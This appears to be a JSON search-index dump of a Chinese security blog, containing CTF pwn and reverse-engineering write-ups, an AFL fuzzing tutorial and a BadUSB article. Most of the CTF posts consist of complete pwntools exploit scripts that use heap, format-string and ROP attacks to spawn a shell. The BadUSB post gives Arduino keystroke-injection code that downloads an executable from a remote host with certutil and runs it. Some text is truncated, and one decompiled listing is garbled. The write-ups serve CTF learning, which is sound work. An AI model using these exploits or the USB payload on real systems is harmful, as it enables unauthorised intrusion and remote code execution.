{"pages":[{"title":"","text":"uRVmNq00Q1","link":"/baidu_verify_uRVmNq00Q1.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index-1.html"},{"title":"about","text":"“我” 到底是个什么东西人生短暂，我想，不被生活拘束，去了解更多","link":"/about/index.html"},{"title":"search","text":"","link":"/search/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"2018国赛PWN复现","text":"2018国赛复现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *#p = process('./task_supermarket')p = remote('ip',port)elf = ELF('./task_supermarket')#context.log_level = 'debug'def add(name,price,descrip_size,des): p.recvuntil('choice>> ') p.sendline('1') p.recvuntil('name:') p.sendline(name) p.recvuntil('price:') p.sendline(str(price)) p.recvuntil('descrip_size:') p.sendline(str(descrip_size)) p.recvuntil('description:') p.sendline(des)def delete(name): p.recvuntil('choice>> ') p.sendline('2') p.recvuntil('name:') p.sendline(name)def list(): p.recvuntil('choice>> ') p.sendline('3')def change_price(name,size_offset): p.recvuntil('choice>> ') p.sendline('4') p.recvuntil('name:') p.sendline(name) p.recvuntil('rise in:') p.sendline(size_offset)def change_des(name,descrip_size,des): p.recvuntil('choice>> ') p.sendline('5') p.recvuntil('name:') p.sendline(name) p.recvuntil('descrip_size:') p.sendline(str(descrip_size)) p.recvuntil('description:') p.sendline(des)add('aaa',1,0x28,'aa')change_des('aaa',0x8,'aa')add('bbb',1,0x28,'bb')change_des('bbb',0x8,'bb')add('ccc',1,0x28,'cc')change_des('ccc',0x8,'cc')add('ddd',1,0x28,'dd')change_des('ddd',0x8,'dd')payload = 'a'*0x4 + p32(0)*2 + p32(0x21) + 'bbb\\x00' + p32(0)*3 + p32(1) + p32(0x48) change_des('aaa',0x28,payload)payload1 = 'b'*0x4 + p32(0)*2 + p32(0x21) + 'ccc\\x00' + p32(0)*3 + p32(1) + p32(0x48) + p32(elf.got['atoi']) + p32(0x14)change_des('bbb',0x48,payload1)list()p.recvuntil('ccc: price.1, des.')atoi_addr = u32(p.recv(4))log.success('atoi addr: 0x%x'% atoi_addr) offset_atoi = 0x02d050offset_system = 0x03a940# offset_atoi = 0x0002d250# offset_system = 0x0003ada0libc_base = atoi_addr - offset_atoisystem_addr = libc_base + offset_systemchange_des('ccc',0x48,p32(system_addr))raw_input(\"go: \")p.sendline('/bin/sh')p.interactive()","link":"/2018/05/05/2018%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"},{"title":"2019西湖论剑CTF 二","text":"0x01 RE1-EasyCpp这题是一道C++逆向，恕我无能，C++符号长到在下看到就想吐，只能用angr跑一跑这样子。。。这题先放着，以后再填坑，orz。。。 0x02 RE2-testRe拿到题目扔进Ida，shift+f12通过关键字符串找到主要逻辑 首先是从标准输入读取16个字节大小的数据，然后进入主要函数进行加密处理，进去分析一波。 贴一下Ida分析出来的伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131__int64 __fastcall sub_400700(void *a1, _QWORD *a2, __int64 input, size_t a4){ unsigned __int8 *v4; // rcx __int64 v6; // [rsp+0h] [rbp-C0h] int c; // [rsp+8h] [rbp-B8h] char v8; // [rsp+Fh] [rbp-B1h] int v9; // [rsp+10h] [rbp-B0h] bool v10; // [rsp+17h] [rbp-A9h] unsigned __int8 *v11; // [rsp+18h] [rbp-A8h] char v12; // [rsp+27h] [rbp-99h] int v13; // [rsp+28h] [rbp-98h] int v14; // [rsp+2Ch] [rbp-94h] unsigned __int64 i; // [rsp+30h] [rbp-90h] size_t n_23; // [rsp+38h] [rbp-88h] size_t v17; // [rsp+40h] [rbp-80h] size_t v18; // [rsp+48h] [rbp-78h] size_t j; // [rsp+50h] [rbp-70h] size_t v20_i; // [rsp+58h] [rbp-68h] int input_2; // [rsp+64h] [rbp-5Ch] unsigned __int64 v22; // [rsp+68h] [rbp-58h] int v23_20; // [rsp+74h] [rbp-4Ch] __int64 *v24; // [rsp+78h] [rbp-48h] __int64 input_1; // [rsp+80h] [rbp-40h] void *v26; // [rsp+88h] [rbp-38h] int v27; // [rsp+94h] [rbp-2Ch] unsigned __int64 v28_16; // [rsp+98h] [rbp-28h] __int64 v29; // [rsp+A0h] [rbp-20h] _QWORD *v30; // [rsp+A8h] [rbp-18h] void *s; // [rsp+B0h] [rbp-10h] char v32; // [rsp+BFh] [rbp-1h] s = a1; v30 = a2; v29 = input; v28_16 = a4; v27 = 0xDEADBEEF; v26 = malloc(0x100uLL); input_1 = v29; v24 = &v6; v22 = 0LL; v17 = 0LL; for ( i = 0LL; i < v28_16; ++i ) { v13 = *(input_1 + i); *(v26 + i) = byte_400E90[i % 0x1D] ^ v13; *(v26 + i) += *(input_1 + i); } while ( 1 ) { v12 = 0; if ( v17 < v28_16 ) v12 = ~(*(input_1 + v17) != 0); if ( !(v12 & 1) ) break; ++v17; } n_23 = ((0x28F5C28F5C28F5C3LL * (138 * (v28_16 - v17) >> 2) >> 64) >> 2) + 1; v23_20 = ((0xAAAAAAAAAAAAAAABLL * ((v17 + v28_16) < 6) >> 64) >> 5) - 1;> 2) >> 64) >> 2) + 16) & 0xFFFFFFFFFFFFFFF0LL); memset(v11, 0, n_23); v20_i = v17; v18 = n_23 - 1; while ( v20_i < v28_16 ) { input_2 = *(input_1 + v20_i); for ( j = n_23 - 1; ; --j ) { v10 = 1; if ( j","link":"/2019/04/24/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91CTF-%E4%BA%8C/"},{"title":"2019国赛 线上赛 PWN&RE","text":"简介2019年国赛线上赛刚刚结束，就我个人来看，这次国赛的题目还算是比较友好的，至少PWN是如此，这边贴一下做出来的题目的思路。 RE1 easyGo拿到题目扔DIE查一波有没有加壳&编译信息，发现未显示，根据题目提示发现是GO语言写的，扔ida看一波发现符号表被裁 找不到main函数无法下手，shift+f12也是没有找到与控制流相关的字符串，头疼，网上搜索了一下往年的go题，发现需要恢复符号，github上找到ida插件idaGolangHelper,选择golang版本号进行恢复 。 这边发现符号都恢复了，找到程序的入口点main.main，静态分析一波逻辑。 由于符号恢复的不是特别理想，一开始有些地方是有点模糊的，动态调一下才发现base64表被替换了。 知道了base以后的串以及base64表，输入写个脚本就出来了。 RE2 bbvvmm根据题目名可以猜出是个vm题，扔ida看了下发现是要你输入用户名和密码，都正确才能输出flag。 一步步往下看，发现有些函数还是特别长的，索性从最后往前分析。 可以看到最后验证正确的话会在远端执行system('cat flag')指令，而要输出flag则必须要V5||V8为0，也就是V5和V8都要是0才行。往上看发现s1与一个类似base64的串进行对比，重点看下sub_400AA6函数内部发现是一个base64的操作，而且base64表又被换过了，emmmmm 随后解一下，结果是EF468DBAF985B2509C9E200CF3525AB6，这边保存一下。 继续往上追溯，发现这个串是输入经过sub_4018C4这个函数加密的结果，静态分析&动态调试调到这边就搞不下去了，里面函数逻辑和涉及的参数都太多，不好分析。 根据调试发现这里的函数按字节拆分，异或等等，类似某种加密，根据放题信息中说的涉及国密进行联想，google了一下国密，找到了常见国密(sm4)的加密源码。 可以看到跟ida反编译后的伪代码是很相似的。 接着往上找，根据sm4的源码分析保存key的参数，找到key。 Gayhub上找到sm4解密脚本，跑一哈，得到用户名。 接下来是密码，一开始没有看到对密码的操作，以为密码可以任意，发现V8||V5那边过不去，猜测V8保存的是对password的认证，给相关内存下断，动态调试了一下发现逻辑很多，猜测是VM，这边利用学弟的逆向引擎建立约束把密码跑出来了,膜拜一哈ORZ。 1234567891011121314151617181920212223242526272829Concat(0, Extract(7, 7, flag_0), ~Extract(6, 3, flag_0), Extract(2, 0, flag_0)) +Concat(0, Extract(7, 7, flag_1), ~Extract(6, 3, flag_1), Extract(2, 1, flag_1), ~Extract(0, 0, flag_1)) +Concat(0, Extract(7, 7, flag_2), ~Extract(6, 3, flag_2), Extract(2, 2, flag_2), ~Extract(1, 1, flag_2), Extract(0, 0, flag_2)) +Concat(0, Extract(7, 7, flag_3), ~Extract(6, 3, flag_3), Extract(2, 2, flag_3), ~Extract(1, 0, flag_3)) +Concat(0, Extract(7, 7, flag_4), ~Extract(6, 2, flag_4), Extract(1, 0, flag_4)) +Concat(0, Extract(7, 7, flag_5), ~Extract(6, 2, flag_5), Extract(1, 1, flag_5), ~Extract(0, 0, flag_5)) 猜测angr和pin也能做，打算看一波dalao的wp后自己去解一下密码。 这边有个坑，最后nc服务器输入用户名密码服务器没有回显，需要在用户名和密码中间加截断。 12345from pwn import *p=remote('39.106.224.151',10001)p.recvuntil('Username:')p.send('badrer12\\n'+'xyz{|}')p.interactive() Pwn1 your_Pwn一道保护全开然鹅却有直接任意地址写&泄露的鸡肋题，漏洞在于数组下标越界，这边贴下exp: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *p=process('./pwn')elf=ELF('./pwn')libc=ELF('./libc.so.6')p.recvuntil('name:')p.sendline('xdw')def leakAndWrite(idx,content): p.recvuntil('input index\\n') p.sendline(str(idx)) p.recvuntil('now value(hex) ') addr=p.recvuntil('\\n').strip() p.recvuntil('input new value\\n') p.sendline(str(content)) return addraddr=leakAndWrite(637,0)[-2::]addr+=leakAndWrite(636,0)[-2::]addr+=leakAndWrite(635,0)[-2::]addr+=leakAndWrite(634,0)[-2::]addr+=leakAndWrite(633,0)[-2::]addr+=leakAndWrite(632,0)[-2::]libc_base=int(addr,16)-libc.symbols['__libc_start_main']-240success('libc_base:'+hex(libc_base))gadget=0x45216+libc_basegadget=hex(gadget)print gadget#success('gadget:'+hex(gadget))#gdb.attach(p)print gadget[2:4]leakAndWrite(344,int(gadget[12:14],16))leakAndWrite(345,int(gadget[10:12],16))leakAndWrite(346,int(gadget[8:10],16))leakAndWrite(347,int(gadget[6:8],16))leakAndWrite(348,int(gadget[4:6],16))leakAndWrite(349,int(gadget[2:4],16))#gdb.attach(p,'''# break *0xx555555554C9C#''')#gdb.attach(p)p.interactive() Pwn2 Daily典型的选单程序，漏洞在于remove list指向的堆块的时候没有对idx进行检查，导致其可以为负，从而可以free指定地址的chunk，所以这边存在一个uaf漏洞。 具体利用流程：首先利用free unsorted bin分别获得main_arena、libc基址以及heap的基址，其次，通过heap基址到bss段list之间的距离算出idx，free用户自己分配的fastbin堆块，之后利用edit功能修改其fd为为__free_hook指针，最后malloc两次，利用one_gadget填充__free_hook块来getshell，这边贴一下脚本。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context(log_level='debug',arch='amd64',os='linux')p=process('./pwn')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')elf=ELF('./pwn')def add(leng,content): p.recvuntil('Your choice:') p.sendline('2') p.recvuntil('Please enter the length of daily:') p.sendline(str(leng)) p.recvuntil('Now you can write you daily') p.sendline(str(content))def dele(idx): p.recvuntil('Your choice:') p.sendline('4') p.recvuntil('Please enter the index of daily:') p.sendline(str(idx))def change(idx,content): p.recvuntil('Your choice:') p.sendline('3') p.recvuntil('Please enter the index of daily:') p.sendline(str(idx)) p.recvuntil('Please enter the new daily') p.sendline(str(content))def show(): p.recvuntil('Your choice:') p.sendline('1')#Leakadd(0x96,'111')add(0x96,'222')add(0x96,'333')add(0x96,'444')dele(0)add(0x96,'1'*7)show()p.recvuntil('0 : 1111111\\n')main_arena=u64(p.recv(6).ljust(8,'\\x00'))libc_base=main_arena-0x3c4b78libc.address=libc_basesuccess('libc_base:'+hex(libc_base))dele(0)dele(2)add(0x96,'1'*7)show()p.recvuntil('0 : 1111111\\n')heap_base=u64(p.recv(3).ljust(8,'\\x00'))-0x140success('heap_base:'+hex(heap_base))add(0x96,p64(0x0))dele(0)dele(1)dele(2)dele(3)#gdb.attach(p)#########################################add(0x60,'deadbeef'+p64(heap_base+0x10))add(0x60,'\\bin\\sh\\x00')add(0x7f,'len')dele((heap_base+0x10-0x602060)/0x10)change(0,p64(0x602078))#gdb.attach(p)add(0x60,'padding')add(0x60,p64(libc.symbols['__free_hook']))change(2,p64(0x4526a+libc_base))dele(1)p.interactive() Pwn3 Baby_Pwn打开ida，发现有栈溢出但是没有输出函数，没有输出函数的话就没法再泄露，所以这题不能用常规思路去做，有栈溢出没有泄露函数，联想到0ctf2018的babystack,看了一下，惊了，以为是原题，栈给的空间大小都差不多。 这边利用Dl_runtime_resolve进行利用，这里贴下脚本了。 12345678910111213141516171819202122from roputils import *from pwn import *r = process('./3')#r = remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com',33865)context.log_level = 'debug'rop = ROP('./3')offset = 44bss_base = rop.section('.bss')buf = rop.fill(offset)buf += rop.call('read', 0, bss_base, 100)buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string('/bin/sh')buf += rop.fill(20, buf)buf += rop.dl_resolve_data(bss_base + 20, 'system')buf += rop.fill(100, buf)r.send(buf)r.interactive() Pwn4 Double一开始没发现哪里有洞，进程一度卡死，后来才注意到add函数里有这个操作： 意思就是当用户输入的内容相同时，不再重新malloc堆块来存储数据，而是利用指针指向那块堆块内存，这样的话就存在两个指针同时指向一块内存的情况，新建多个fastbin所在的chunk，free掉存储数据的堆块，利用edit函数修改其fd指向__malloc_hook，之后就是fastbinAttack时间了，利用one_gadget写__malloc_hook，getshell，结束。 这边贴一下脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *#context(log_level='debug',arch='amd64',os='linux')p=process('./pwn')#p=remote('394c6c946290cc950ef635bd899fafa1.kr-lab.com',40002)elf=ELF('./pwn')def add(content): p.recvuntil('> ') p.sendline('1') p.recvuntil('Your data:\\n') p.sendline(str(content))def dele(idx): p.recvuntil('> ') p.sendline('4') p.recvuntil('Info index:') p.sendline(str(idx))def change(idx,content): p.recvuntil('> ') p.sendline('3') p.recvuntil('Info index: ') p.sendline(str(idx)) p.sendline(str(content))def show(idx): p.recvuntil('> ') p.sendline('2') p.recvuntil('Info index:') p.sendline(str(idx))add('1'*0x80)add('1'*0x80)dele(0)show(1)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')p.recv(1)libc_base=u64(p.recv(6).ljust(8,'\\x00'))libc_base -= 0x3c4b78log.success(\"libc_base = %s\"%hex(libc_base))add('2'*0x60)add('2'*0x60)#gdb.attach(p)dele(2)#gdb.attach(p)malloc_hook = libc_base + libc.symbols['__malloc_hook']#print hex(malloc_hook)log.success(\"__malloc_hook:%s\"%hex(malloc_hook))change(3,p64(malloc_hook-0x23))add('a'*0x60)one_gadget = libc_base + 0x4526apayload='a'*0x13payload+=p64(one_gadget)payload=payload.ljust(0x60,'a')add(payload)#gdb.attach(p)p.sendline('1\\n')p.recv(4096)p.interactive() 总结这次国赛pwn和逆向都还是比较友好的，难度呈梯度上升，有层次感，相对去年国赛，感觉自己进步还是很大的，一年过去了，人生有几个一年呢？加油加油！","link":"/2019/04/24/2019%E5%9B%BD%E8%B5%9B-%E7%BA%BF%E4%B8%8A%E8%B5%9B-PWN-RE/"},{"title":"2019西湖论剑CTF","text":"由于最近忙的多西很多，导致2019西湖论剑CTF忘记报名了，只能用队友的账号上去做了一下，赛题体验良好，题目还是很中规中矩的，虽然依旧是被吊锤(脸红)。比赛是从上午九点打到晚上九点，时间可以说是很短了，这边由于做pwn调试的时候花费了大量的时间和精力，导致最后没有耐心去看其它题目了(菜！！！)，贴一下做出来的题目。 RE2 easyCpp拿到题目后直接拖ida看逻辑，发现都是CPP冗长的符号。。。。头疼，分析是不可能分析的，这辈子都不可能。。。。大概看了些逻辑，顺手就拖进了angr，跑了5min，出来了。。。。。 等官方WP出来以后再来复盘一波 PWN2 storychecksec一下发现有canary和nx，ida载入发现格式化字符串 由于这边的格式化字符串只能利用一次，而且libc地址还不知道，所以这边肯定不是ssp、stack_check_fail劫持之类的。 这边发现程序存在溢出，猜测是利用格式化字符串泄露canary，之后溢出，构造rop或者ret2libc来getshell。 贴下脚本: 1234567891011121314151617181920212223242526from pwn import *p=process('./story')p=remote('ctf2.linkedbyx.com',10655)##gdb.attach(p,'''# break *0x0000000000400A53# break *0x0000000000400A1C# continue#''')libc=ELF('./libc6_2.23-0ubuntu10_amd64.so')p.recvuntil('Please Tell Your ID:')p.sendline('%25$lx%15$lx')x`p.recvuntil('Hello ')#print p.recvline()libc_main=int(p.recv(12),16)-240libc_base=libc_main-libc.symbols['__libc_start_main']bin_sh=libc.search('/bin/sh').next()+libc_basesystem=libc.symbols['system']+libc_base#print hex(libc_system)canary=int(p.recvline(),16)#print canaryp.recvuntil('Tell me the size of your story:')p.sendline('129')p.recvuntil('You can speak your story:')payload='a'*136+p64(canary)+'a'*8+p64(0xf1147+libc_base)+100*p64(0x0)p.sendline(payload)p.interactive() 这边rop用的是one_gadget，注意需要满足[rsp+0x??]为空的条件，这里可以利用大范围高字节溢出，把rbp-4之后的地址全部淹没为空。 PWN3 noinfoLeak看保护发现只有pie没有开，不用猜都知道肯定是堆题。程序本来的符号表是被裁掉的，这边通过分析程序功能补全了一下。 程序主要有三个功能，malloc、free、input，分配的堆块的大小和地址存储在bss上的list中。通过静态分析可以发现free没有对chunk进行检查，所以这边有个doublefree，input_list函数同样没有对chunk是否已经free进行检查，导致这边又有个uaf。看到这边单纯的我想到的思路就是通过uaf改写free chunk的fd指向，通过fastbinAttack改写全局list内容，然后利用程序本身的input_list功能进行got覆写，最后one_gadget一把梭结束战斗。然鹅，我还是低估了出题人的险恶用心(拍桌！！！)，因为，这题，居然没法直接泄露。。。话说回来，万变不离其宗，此题也只是无法直接泄露，都能任意地址写了，还怕没法泄露地址的咩改个got表就吼了。贴下脚本: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = \"debug\"p = process(\"./noinfoleak\")#p = remote(\"ctf1.linkedbyx.com\" , 10216)elf = ELF(\"./noinfoleak\")libc = elf.libcsla = lambda c : p.sendlineafter(\">\" , str(c))sa = lambda c : p.sendafter(\">\" , str(c))def add(size , content): sla(1) sla(size) sa(content)def delete(idx): sla(2) sla(idx)def edit(idx , content): sla(3) sla(idx) sa(content)# fastbin attack to control note_list stdin = 0x601090add(0x60 , \"padding\")add(0x60 , \"padding\")add(0x60 , \"padding\")add(0x60 , \"/bin/sh\\x00\")delete(0)gdb.attach(p)edit(0 , p64(stdin + 5 - 0x8))add(0x60 , \"padding\") # clearpayload = \"a\" * 3 + p64(elf.got[\"free\"]) + p64(0x8) + p64(elf.got[\"read\"]) + p64(0x8)add(0x60 , payload)edit(0 , p64(elf.plt[\"puts\"] ))delete(1)read_addr = u64(p.recvuntil(\"\\x7f\").ljust(8 , \"\\x00\"))libc.address = read_addr - libc.sym[\"read\"]log.info(\"libc : \" + hex(libc.address))edit(0 , p64(libc.sym[\"system\"]))delete(3)# gdb.attach(p)# leak libc # modify free to system for getshellp.interactive() 总结打一天时间还是太短了，有些题目来不及刚都，等着官方WP出了去复盘一波。","link":"/2019/04/24/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91CTF/"},{"title":"AFL-Fuzz技术初探","text":"0x01 AFL-Fuzz介绍模糊测试(Fuzzing)技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究员发现漏洞的首选技术。AFL-Fuzz、LibFuzzer、honggFuzz等操作简单友好的工具相继出现，大大降低了漏洞挖掘的门槛。AFL(American Fuzzy Lop)是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导(Coverage-guided)的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。AFL-Fuzz通过在相关代码处进行插桩，来对程序内部的执行路径进行探索，挖掘可能存在的漏洞如栈溢出、堆溢出、UAF、DOUBLEFREE等等，由于要对程序进行插桩，所以AFL-Fuzz主要用于对开源软件进行测试，当然配合QEMU等工具也可以对闭源代码进行Fuzzing，不过执行效率会受影响。组成： 编译器wrapper，该部分用于编译目标代码(afl-gcc、afl-clang等) Fuzzer：afl-fuzz，fuzzing的主要工具 afl-cmin、afl-tmin等 工作流程： 从源码编译程序时进行插桩，以记录代码覆盖率(Code Coverage) 选择测试文件作为初始测试集加入队列 对队列中的样本文件进行变化，生成大量样本 如果变异文件更新了覆盖范围，将其留在队列中，否则舍弃 上述过程会一直循环，直到程序出现Crash，Crash的文件会被记录下来 0x02 安装直接去官网上下载源码编译安装 makesudo make install 输入afl能补全的话就是安装完成了 0x03 语料库的选择AFL需要一些初始输入数据(种子文件)，作为fuzzing的起点，afl可以根据自己的算法生成相应的文件格式，就算输入数据毫无意义，lcamtuf就在其官网上给出例子：对djpeg进行fuzzing的时候，仅输入一个hello字符串，而fuzzer自动生成了大量的jpeg样本。虽然fuzzer本身的生成算法很强大，但是为了提高afl的fuzz速度，探索更多的有效路径，选择一个高质量的语料库是有必要的。AFL-Fuzz官网下的测试集其它一些开源的语料库：Fuzzer-test-suiteSamples-libavSamples-ffmpegFuzzDataMoonLight 语料库中通常包含有大量文件，这时需要对其进行精简，专业术语叫做”语料蒸馏”。Afl-Fuzz提供了两个工具 (1)移除执行相同代码的输入文件—-afl-cminafl-cmin目的是尝试找到语料库全集在此程序执行不同路径的最小子集。一个大的语料库对测试程序来说很可能存在多个不同文件执行了相同代码，探索了相同的路径，afl-cmin就是对此进行精简，舍弃相同执行路径的测试集。 (2)减小单个输入文件的大小—-alf-tmin整体大小得到改善以后，需要对单个文件进行更细化的处理，舍弃单个文件中的部分数据，提高afl-fuzz的执行速度。 0x04 源码插桩编译由于需要对源码进行插桩，所以这里需要更换程序编译器为AFL-Fuzz自带的afl-gcc/afl-g++ $ ./configure CC=”afl-gcc” CXX=”afl-g++” 或者修改MakeFile也是可以的。 Afl-Fuzz还有一个llvm模式，可以通过优化代码提高Fuzz速度。 0x05 开始Fuzzing这边选用了一个libtiff的历史版本来进行测试，首先编译，发现生成了一些可执行程序 建立输入输出文件夹，将AFL官网语料库中的bmp文件库集合放到input文件夹下作为输入，然后输入命令进行fuzz 如果fuzz的程序是从标准输入获取的，那么这边不需要@@，如果是从文件进行读取的，这边需要用@@进行一个替换。 这边报错了设置一下core转储路径 sudo suecho core >/proc/sys/kernel/core_pattern 这边又报错了看了下好像bmp2tiff用到了so库，由于没有对so库进行插桩，所以这边出现了错误。解决方法有两个： 静态构建./configure后面跟–disable-shared参数 指定插桩过的so库通过设置LD_LIBRARY_PATH让程序加载插桩过的so库 这边直接静态构建，之后Fuzz发现能跑起来了。 0x06 AFL窗口状态这边对窗口内容进行一下介绍： process timingFuzzer运行时长、距离最近发现的路径、上一个崩溃和挂起经历了多长世间。这边要注意如果输入参数有错误的话，执行路径是一直不会变而且会提醒你syntax error的 overall results从上至下依次是程序执行的总周期数、总路径数、崩溃次数和超时次数 cycle progress已经处理的输入队列中的文件数 map coverage插桩代码记录下的覆盖率 stage progressFuzzer正在执行的文件变异策略、总的执行文件大小、执行速度 findings in depth有关我们找到的执行路径、总崩溃数等 这边官网有详述。 0x07 Crash可以看到AFL在output文件夹下生成了crash和hangs的样本拿到样本以后可以动态调试走一波，找到崩溃点，看能否进行利用。这边有个相关的内存检测框架Valgrind，它能根据提供的样本进行异常检测，并将漏洞类型和产生漏洞的地址进行输出，测试者可以直接定位。 0x08 黑盒AFL也支持无源码插桩，这边利用了qemu进行动态二进制插桩，看dalao博客的解释有点类似JIT，贴一下回去慢慢理解 1234这是因为QEMU使用basic blocks作为翻译单元，利用QEMU做instrumentation，启动很慢的QEMU mode同样使用了一个fork server，和编译期一样，通过把一个已经初始化好的进程镜像，直接拷贝到新的进程中。所以相当于第一次翻译一个新的basic block，这肯定会有必要的延迟，为了解决这个问题AFL forkserver在emulator和父进程之间提供了一个信息管道。这个信息管道用来通知父进程新添加的blocks的地址，之后把这些blocks放到一个缓存中，以便直接复制到将来的子进程中。但这样处理之后，QEMU模式对目标程序造成2-5倍的减速。 无源码状态下二进制程序的Fuzz首先需要安装QEMU虚拟机，Fuzz的时候著需要增加-Q选项就能在qemu模式下进行fuzzing了。 $ afl-fuzz -Q -i input -o output /path/to/program [params] @@ 0x09 总结听说跑Fuzz烧硬盘，阔怕，以后得上服务器跑了23333333 基本就是这样子了，希望能早日挖到属于自己的洞，拿到属于自己的CVE号~ 队友：醒醒，该敲代码了!!!","link":"/2019/04/17/AFL-Fuzz%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/"},{"title":"BadUsb从协议分析到实战渗透","text":"0x00 锲子这篇博文缘起公司一位单片机dalao的月末技术分享，当时觉得是挺有意思的，顺带着自己目前的研究方向又是偏向硬件（无线）、协议这一块，又恰好之前公司接了一家公司的授权实地渗透，当时有想法是就是扔badusb（捂脸），这边仅记录下学习过程。 0x01 USB介绍 USB(Universal Serial Bus)原意是指通用串行总线，是一个外部总线标准，用于规范电脑与外部设备的连接和通讯，这套标准在1994年底由英特尔、康柏、IBM、Microsoft等多家公司联合提出，提出之后经过一个快速的发展成功替代串口和并口等标准，成为一个世界认可的统一标准，被当代的海量设备使用。 HID(Human Interface Device)是一种计算机协议，约定了计算机在完成通讯过程时所要遵守规则，HID协议使得设备之间无需安装驱动就能进行交互，基于HID协议的USB设备有USB键盘、鼠标等。 0x02 BadUsb介绍起源： BadUSB最早是在2014年的BlackHat安全会议上由研究人员JakobLell和Karsten Nohl提出并展示的（PDF资料）。不同于其他的U盘病毒，它利用HID协议无需安装驱动就能进行交互的功能，通过模拟键盘、鼠标、网卡等设备，最终拿下Shell或者窃取敏感信息等。 原理： 主机是通过设备固件中的某些描述符来判断USB哪种设备的。这就意味着我们可以利用此漏洞将一些特殊的USB设备伪装成为其他任何设备，例如输入设备、网卡等等。 当插入USB设备后，主机驱动会向设备请求各种描述符来识别设备，为了把一个设备识别成HID类别，设备固件在定义描述符的时候必须遵守HID规约。 构成： 普通U盘一般都是由闪存（FLASH）和主控（MCU）构成，主控主要负责控制数据读写任务分配，闪存的话一般有一部分用来存放u盘固件（无法直接读取），其它部分用来进行读写和存储。 BadUsb就是利用对u盘固件进行重新编程，将虚拟键盘输入转为协议约定的字节指令集成进固件中，让主机将usb识别为一块键盘，并执行事先编写好的虚拟键盘输入。 0x03 BadUsb危害及利用方式危害： 恶意代码存在于U盘的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法防御BadUSB的攻击。 利用： BadUSB插入后，可以模拟键盘、鼠标等设备对电脑进行操作，例如通过这些操作打开电脑的命令终端，并执行恶意命令，从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。 0x04 攻击代码&演示贴下实物： 这边买的是某宝上制成U盘模样的Arduino Leonardo，50RMB左右就能入手一块了，恶意代码可以用Arduino进行烧录 贴下代码：这边贴的是一个最简单的cmd远端下载恶意文件执行，因为只是为了解原理，所以没有加绕杀软uac的代码: 123456789101112131415161718192021222324252627282930#include void setup() {Keyboard.begin();//开始键盘通讯delay(1000);//延时Keyboard.press(KEY_LEFT_GUI);//win键Keyboard.press('r');//r键Keyboard.release(KEY_LEFT_GUI);Keyboard.release('r');Keyboard.press(KEY_CAPS_LOCK);Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(\"CMD.EXE\");Keyboard.press(KEY_RETURN);Keyboard.release(KEY_RETURN);delay(1000);Keyboard.println(\"certutil -urlcache -split -f http://yourIP/1.EXE D:\\\\1.exe\"); //服务器下载恶意文件Keyboard.press(KEY_RETURN);Keyboard.release(KEY_RETURN);Keyboard.println(\"D:\\\\1.exe\");Keyboard.press(KEY_RETURN);Keyboard.release(KEY_RETURN);Keyboard.println(\"exit\");Keyboard.press(KEY_RETURN);Keyboard.release(KEY_RETURN);Keyboard.end();//结束键盘通讯}void loop()//循环{} 插入BadUsb： 贴下getShell图片： 贴下视频：这边贴下玄武实验室的视频链接 0x05 漏洞根源及防御对策的可行性漏洞原因： BadUsb漏洞的根源在于USB固件可以被重新编写，而由于主机对HID设备的过分信任，导致计算机无法识别当前设备是合法设备还是被改造过的设备。 防护思路&缺陷： 防护思路 缺陷 USB设备白名单 USB设备通常没有唯一的序列号 ；操作系统也没有对应的白名单机制 屏蔽危险的设备类别，或者完全屏蔽USB设备 影响可用性；通用设备易被滥用，如果屏蔽，则基本没有可用USB设备 扫描外围设备固件中的恶意代码 必须在固件本身的支持下（可能不支持），才能读取USB设备固件 对固件更新使用代码签名 在微型控制器上难以实现安全的认证系统；大量设备目前已经存在漏洞 禁止硬件的固件更新 简单有效（但主要局限于新设备） 0x06 学习资料","link":"/2019/10/22/BadUsb%E4%BB%8E%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%88%B0%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"},{"title":"CTF线下赛心得与体会","text":"上个星期刚刚打完了省赛，很有感触。比赛分上下午两个时间段，上午和下午的靶场环境是不同的，30分钟一轮flag。 上午主办方给了我们一个windows server一个linux给我们维护，windows server我们因为没有玩过所以被检测到挂了后门，但是后来听说只有一个队找出了windows 